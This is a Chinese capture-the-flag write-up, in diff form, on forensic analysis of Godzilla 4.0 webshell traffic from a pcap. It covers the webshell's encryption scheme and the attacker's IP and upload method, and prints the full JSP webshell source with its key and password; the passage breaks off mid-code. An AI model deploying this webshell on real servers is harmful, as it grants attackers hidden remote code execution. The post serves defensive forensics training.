href="#12%E3%80%81%E9%BB%91%E5%AE%A2%E8%AE%BE%E7%BD%AE%E7%9A%84%E5%90%8E%E9%97%A8%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.12.</span> <span class="toc-text">12、黑客设置的后门密码是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13%E3%80%81%E9%BB%91%E5%AE%A2%E7%9A%84%E6%81%B6%E6%84%8Fdnslog%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.13.</span> <span class="toc-text">13、黑客的恶意dnslog服务器地址是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFdnslog%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9F"><span class="toc-number">4.13.1.</span> <span class="toc-text">什么是dnslog服务器？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">4.13.1.1.</span> <span class="toc-text">DNSLog 服务器的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">4.13.1.2.</span> <span class="toc-text">DNSLog 服务器的用途</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLog-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.13.1.3.</span> <span class="toc-text">DNSLog 服务器的特点</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        玄机第六章哥斯拉4.0流量分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-22T15:53:27.000Z" class="dt-published" itemprop="datePublished">2025-04-22</time>
+        
+        (Updated: <time datetime="2025-04-22T19:07:10.738Z" class="dt-updated" itemprop="dateModified">2025-04-23</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%8E%84%E6%9C%BA/">玄机</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">玄机第六章哥斯拉流量分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/142593664?ops_request_misc=%257B%2522request%255Fid%2522%253A%25220fc1b5b5668594769589373b8a9e83b4%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=0fc1b5b5668594769589373b8a9e83b4&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-142593664-null-null.nonecase&utm_term=%E7%8E%84%E6%9C%BA&spm=1018.2226.3001.4450">玄机——第六章-哥斯拉4.0流量分析 wp</a></p>
+<h1 id="什么是哥斯拉"><a href="#什么是哥斯拉" class="headerlink" title="什么是哥斯拉"></a>什么是哥斯拉</h1><p><strong>哥斯拉（Godzilla）</strong> 是一款功能强大的 <strong>WebShell</strong> 工具，主要用于渗透测试和攻击中。它以其高度隐蔽性和丰富的功能而闻名，能够绕过传统的安全检测机制（如防火墙、IDS&#x2F;IPS 等），并在目标服务器上执行各种恶意操作。</p>
+<h1 id="哥斯拉webshell的特征"><a href="#哥斯拉webshell的特征" class="headerlink" title="哥斯拉webshell的特征"></a>哥斯拉webshell的特征</h1><ul>
+<li>哥斯拉Webshell通常以PHP、ASP、JSP等格式存在，文件名可能模糊不清，或使用常见文件名进行伪装。</li>
+<li>哥斯拉通常会使用 <strong>AES加密算法</strong> 对请求和响应数据进行加密，默认密钥为 <code>e45e329feb5d925b</code>。</li>
+</ul>
+<p>哥斯拉最大的特征：<strong>全部类型的“shell”都能绕过，而且市面大部分的静态查杀、流量加密也是都能绕过市面绝大部分的流量Waf、而且Godzilla自带的插件是冰蝎、蚁剑不能比拟的。</strong></p>
+<p>完整的哥斯拉shell的流程包括三个数据包</p>
+<ul>
+<li>第一个请求包</li>
+</ul>
+<p>上传包含恶意代码的文件或者写入恶意代码，这些代码也有可能是加密以后的代码</p>
+<ul>
+<li>第一个响应包</li>
+</ul>
+<p>该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是可能会设置PHPSESSID，后续请求都会自动带上该Cookie。（但是在后续的版本中有时候是没有设置cookie的）</p>
+<ul>
+<li>第二个请求包</li>
+</ul>
+<p>第二个请求报文发送很少数据（实际内容为测试连接命令test），返回少量数据（即ok）</p>
+<ul>
+<li>第二个响应包</li>
+</ul>
+<p>服务器响应数据解密过程并不复杂，先调用findStr函数删除服务器响应数据左右附加的混淆字符串（对于PHP_XOR_BASE64加密方式来说，前后各附加了16位的混淆字符），然后将得到的数据进行base64解码，最后再和shell连接密钥md5值的前16位按位异或，即完成响应数据的解密。</p>
+<ul>
+<li>第三个请求包</li>
+</ul>
+<p>运行哥斯拉命令执行代码中的getBasicsInfo函数得到的系统基本信息。</p>
+<ul>
+<li>第三个响应包</li>
+</ul>
+<p>将加密的系统基本信息进行解密返回到响应数据中</p>
+<h1 id="哥斯拉加密分析"><a href="#哥斯拉加密分析" class="headerlink" title="哥斯拉加密分析"></a>哥斯拉加密分析</h1><p>1.我们首先就行在客户端生成webshell，webshell中通常有以下几个变量，包括：<strong>密码、密钥、有效载荷、加密器</strong></p>
+<ul>
+<li>密码：Post请求中的payload参数名称，例如我们这道题中hello.jsp中的pass&#x3D;”7f0e6f”，以及用于和密钥一起进行加密运算。</li>
+<li>用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后取其<strong>前16位</strong>用于加密过程</li>
+<li>有效载荷：分为<code>ASP</code>、<code>java</code>、<code>php</code>、<code>c#</code>四种类型的payload</li>
+<li>加密器分为base64和raw、evalbase64三大类。例如我们下面的hello.jsp就是用的base64进行加密的</li>
+<li>扰乱数据：用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征。</li>
+</ul>
+<p>2.上传我们的webshell，文件名可自定义，根据选择的有效载荷不同，可以有jsp、php、aspx等文件格式</p>
+<p>这个文件的内容，会出现在数据包的POST请求中。该文件在利用的时候会将密码、密钥的md5值前16位明文写入。</p>
+<p>该文件的实现功能还有：将密码和密钥进行拼接，然后进行md5的计算。一共32位。服务器端返回数据的时候，会进行拼接。</p>
+<p><strong>即服务器端返回数据 &#x3D; md5前16位+加密数据+md5后16位。（加密数据可以通过对服务器端的解密算法进行解密）</strong></p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请你登录服务器结合数据包附件来分析黑客的入侵行为</span><br><span class="line"></span><br><span class="line">用户名：root</span><br><span class="line"></span><br><span class="line">密码：xj@gsl4.0</span><br><span class="line"></span><br><span class="line">SSH连接：ssh root@ip -p 222</span><br></pre></td></tr></table></figure>
+
+<p>附件是gsl4.0.pcap文件</p>
+<h2 id="1、黑客的IP是什么？"><a href="#1、黑客的IP是什么？" class="headerlink" title="1、黑客的IP是什么？"></a>1、黑客的IP是什么？</h2><p>先过滤出来http的流量包</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423001130024.png" alt="image-20250423001130024"></p>
+<p>可以看到有大量的路径访问和404的响应，发现有一个恶意ip192.168.31.190在对服务器ip192.168.31.168进行目录扫描操作，估计就是黑客ip了</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423001910080.png" alt="image-20250423001910080"></p>
+<p>并且发现这个ip在尝试使用PUT协议上传了hello.jsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.190&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）"><a href="#2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）" class="headerlink" title="2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）"></a>2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）</h2><p>这个的话我们可以从几个点去入手</p>
+<ul>
+<li>识别请求类型：</li>
+</ul>
+<p>确定是否存在特定的 HTTP 请求（如 PUT 或 POST），这些请求通常用于上传恶意代码或进行远程执行。</p>
+<ul>
+<li>分析请求内容：</li>
+</ul>
+<p>查找特定的参数或 传入的payload，如含有 base64 编码的数据或任何可被反序列化的对象。分析这些内容是否能够触发已知漏洞。</p>
+<ul>
+<li>查找特征：</li>
+</ul>
+<p>确认是否有反序列化、命令注入或文件上传的迹象，这些通常是常见的攻击手法。</p>
+<ul>
+<li>关注响应状态：</li>
+</ul>
+<p>检查服务器的响应状态（如 204 No Content），这可能表明攻击成功，服务器没有返回错误信息。</p>
+<p>然后我们来分析一下</p>
+<p>找到了一个204状态码的数据包</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423002810926.png" alt="image-20250423002810926"></p>
+<h3 id="204状态码"><a href="#204状态码" class="headerlink" title="204状态码"></a>204状态码</h3><p><strong>204 No Content</strong> 是HTTP协议中的一种状态响应码，表示服务器成功处理了客户端的请求，但响应报文中没有返回任何内容。</p>
+<p>这符合哥斯拉shell的第一个响应包的结果，意味着我们的webshell上传成功了，然后我们来分析一下我们的webshell</p>
+<h3 id="webshell分析"><a href="#webshell分析" class="headerlink" title="webshell分析"></a>webshell分析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! <span class="title class_">String</span> xc=<span class="string">&quot;1710acba6220f62b&quot;</span>; </span><br><span class="line"><span class="title class_">String</span> pass=<span class="string">&quot;7f0e6f&quot;</span>;</span><br><span class="line"><span class="title class_">String</span> md5=<span class="title function_">md5</span>(pass+xc); </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassLoader</span> &#123;</span><br><span class="line">     public <span class="title function_">X</span>(<span class="params">ClassLoader z</span>) &#123; </span><br><span class="line">         <span class="variable language_">super</span>(z); </span><br><span class="line">     &#125;</span><br><span class="line">     public <span class="title class_">Class</span> <span class="title function_">Q</span>(<span class="params">byte[] cb</span>) &#123; </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">defineClass</span>(cb, <span class="number">0</span>, cb.<span class="property">length</span>); </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">public byte[] <span class="title function_">x</span>(<span class="params">byte[] s, boolean m</span>) &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         javax.<span class="property">crypto</span>.<span class="property">Cipher</span> c = javax.<span class="property">crypto</span>.<span class="property">Cipher</span>.<span class="title function_">getInstance</span>(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">         c.<span class="title function_">init</span>(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> javax.<span class="property">crypto</span>.<span class="property">spec</span>.<span class="title class_">SecretKeySpec</span>(xc.<span class="title function_">getBytes</span>(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">         <span class="keyword">return</span> c.<span class="title function_">doFinal</span>(s);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">String</span> s</span>) &#123;</span><br><span class="line">    <span class="title class_">String</span> ret = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.<span class="property">security</span>.<span class="property">MessageDigest</span> m = java.<span class="property">security</span>.<span class="property">MessageDigest</span>.<span class="title function_">getInstance</span>(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        m.<span class="title function_">update</span>(s.<span class="title function_">getBytes</span>(), <span class="number">0</span>, s.<span class="title function_">length</span>());</span><br><span class="line">        ret = <span class="keyword">new</span> java.<span class="property">math</span>.<span class="title class_">BigInteger</span>(<span class="number">1</span>, m.<span class="title function_">digest</span>()).<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">toUpperCase</span>(); <span class="comment">// 生成MD5哈希值</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">base64Encode</span>(byte[] bs) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="title class_">Class</span> base64;</span><br><span class="line">    <span class="title class_">String</span> value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="title class_">Object</span> <span class="title class_">Encoder</span> = base64.<span class="title function_">getMethod</span>(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).<span class="title function_">invoke</span>(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (<span class="title class_">String</span>) <span class="title class_">Encoder</span>.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; byte[].<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(<span class="title class_">Encoder</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> <span class="title class_">Encoder</span> = base64.<span class="title function_">newInstance</span>();</span><br><span class="line">            value = (<span class="title class_">String</span>) <span class="title class_">Encoder</span>.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; byte[].<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(<span class="title class_">Encoder</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> byte[] <span class="title function_">base64Decode</span>(<span class="title class_">String</span> bs) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="title class_">Class</span> base64;</span><br><span class="line">    byte[] value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="title class_">Object</span> decoder = base64.<span class="title function_">getMethod</span>(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).<span class="title function_">invoke</span>(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (byte[]) decoder.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="title class_">String</span>.<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> decoder = base64.<span class="title function_">newInstance</span>();</span><br><span class="line">            value = (byte[]) decoder.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="title class_">String</span>.<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    byte[] data = <span class="title function_">base64Decode</span>(request.<span class="title function_">getParameter</span>(pass)); <span class="comment">// 获取并解码请求参数</span></span><br><span class="line">    data = <span class="title function_">x</span>(data, <span class="literal">false</span>); <span class="comment">// 解密数据</span></span><br><span class="line">    <span class="keyword">if</span> (session.<span class="title function_">getAttribute</span>(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">        session.<span class="title function_">setAttribute</span>(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title function_">X</span>(<span class="variable language_">this</span>.<span class="title function_">getClass</span>().<span class="title function_">getClassLoader</span>()).<span class="title function_">Q</span>(data)); <span class="comment">// 动态加载字节码</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        request.<span class="title function_">setAttribute</span>(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">        java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span> arrOut = <span class="keyword">new</span> java.<span class="property">io</span>.<span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="title class_">Object</span> f = ((<span class="title class_">Class</span>) session.<span class="title function_">getAttribute</span>(<span class="string">&quot;payload&quot;</span>)).<span class="title function_">newInstance</span>();</span><br><span class="line">        f.<span class="title function_">equals</span>(arrOut);</span><br><span class="line">        f.<span class="title function_">equals</span>(pageContext);</span><br><span class="line">        response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(md5.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">        f.<span class="title function_">toString</span>();</span><br><span class="line">        response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(<span class="title function_">base64Encode</span>(<span class="title function_">x</span>(arrOut.<span class="title function_">toByteArray</span>(), <span class="literal">true</span>))); <span class="comment">// 加密并返回结果</span></span><br><span class="line">        response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(md5.<span class="title function_">substring</span>(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码结构分析：</p>
+<p>这段代码是一个典型的 <strong>JSP WebShell</strong>，通常用于在目标服务器上执行恶意操作。</p>
+<ol>
+<li><p>声明部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! ... %&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>定义了类、方法和变量，用于加密、解密、Base64编码&#x2F;解码、类加载等操作。</li>
+</ul>
+</li>
+<li><p>执行部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ... %&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>处理HTTP请求，解析参数，执行恶意操作，并返回结果。</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><code>String xc=&quot;1710acba6220f62b&quot;;</code>：这是用于 AES 加密的密钥。</li>
+<li><code>String pass=&quot;7f0e6f&quot;;</code>：用于参数传递的字符串，可能是攻击者用来获取数据的密码。</li>
+<li><code>md5</code>：生成 <code>pass</code> 和 <code>xc</code> 的 MD5 哈希，用于后续验证或其他操作。</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassLoader</span> &#123;</span><br><span class="line">     public <span class="title function_">X</span>(<span class="params">ClassLoader z</span>) &#123; </span><br><span class="line">         <span class="variable language_">super</span>(z); </span><br><span class="line">     &#125;</span><br><span class="line">     public <span class="title class_">Class</span> <span class="title function_">Q</span>(<span class="params">byte[] cb</span>) &#123; </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">defineClass</span>(cb, <span class="number">0</span>, cb.<span class="property">length</span>); </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//定义了一个自定义的 ClassLoader，类名为X，通过调用 defineClass 方法，允许动态加载和执行字节码。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public byte[] <span class="title function_">x</span>(<span class="params">byte[] s, boolean m</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         javax.<span class="property">crypto</span>.<span class="property">Cipher</span> c = javax.<span class="property">crypto</span>.<span class="property">Cipher</span>.<span class="title function_">getInstance</span>(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">         c.<span class="title function_">init</span>(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> javax.<span class="property">crypto</span>.<span class="property">spec</span>.<span class="title class_">SecretKeySpec</span>(xc.<span class="title function_">getBytes</span>(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">         <span class="keyword">return</span> c.<span class="title function_">doFinal</span>(s);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//用于AES加密或解密数据，m 参数决定了是加密（true）还是解密（false）。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">String</span> s</span>) &#123;</span><br><span class="line">    <span class="title class_">String</span> ret = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.<span class="property">security</span>.<span class="property">MessageDigest</span> m = java.<span class="property">security</span>.<span class="property">MessageDigest</span>.<span class="title function_">getInstance</span>(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        m.<span class="title function_">update</span>(s.<span class="title function_">getBytes</span>(), <span class="number">0</span>, s.<span class="title function_">length</span>());</span><br><span class="line">        ret = <span class="keyword">new</span> java.<span class="property">math</span>.<span class="title class_">BigInteger</span>(<span class="number">1</span>, m.<span class="title function_">digest</span>()).<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">toUpperCase</span>(); <span class="comment">// 生成MD5哈希值</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//MD5哈希，用于将输入的字符串 s 转换为一个 32 字符的 MD5 哈希值。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">base64Encode</span>(byte[] bs) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="title class_">Class</span> base64;</span><br><span class="line">    <span class="title class_">String</span> value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="title class_">Object</span> <span class="title class_">Encoder</span> = base64.<span class="title function_">getMethod</span>(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).<span class="title function_">invoke</span>(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (<span class="title class_">String</span>) <span class="title class_">Encoder</span>.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; byte[].<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(<span class="title class_">Encoder</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs 